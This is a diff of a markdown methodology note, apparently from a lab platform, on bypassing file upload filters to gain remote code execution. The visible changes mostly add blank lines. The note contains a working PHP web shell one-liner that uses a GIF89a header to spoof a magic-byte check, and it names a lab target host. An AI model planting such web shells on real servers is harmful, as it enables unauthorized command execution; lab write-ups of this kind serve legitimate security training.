@@ -1,9 +1,11 @@
 # Comprehensive File Upload Bypass Methodology
 
 ## 🎯 Objective
+
 Demonstrate multiple techniques to bypass file upload security controls and achieve remote code execution.
 
 ## 🔍 Common Security Controls Analyzed
+
 1. **File Signature Validation**: Magic byte checking
 2. **Extension Filtering**: Blacklist/whitelist approaches
 3. **MIME Type Verification**: Client vs server validation
@@ -12,9 +14,11 @@ Demonstrate multiple techniques to bypass file upload security controls and achi
 ## 💥 Bypass Techniques Demonstrated
 
 ### Technique 1: File Signature Spoofing
+
 **Target**: `related-chat.apac01.hackviser.space`
 **Vulnerability**: Naive magic byte checking without content analysis
 **Method**:
+
 ```bash
 # Add GIF header to PHP shell
 echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php
@@ -70,3 +74,4 @@ Content Manipulation: Differentiating file headers from executable content
 Defense-in-Depth Analysis: Evaluating cumulative security control effectiveness
 
 Conducted in controlled environment for educational purposes
+```
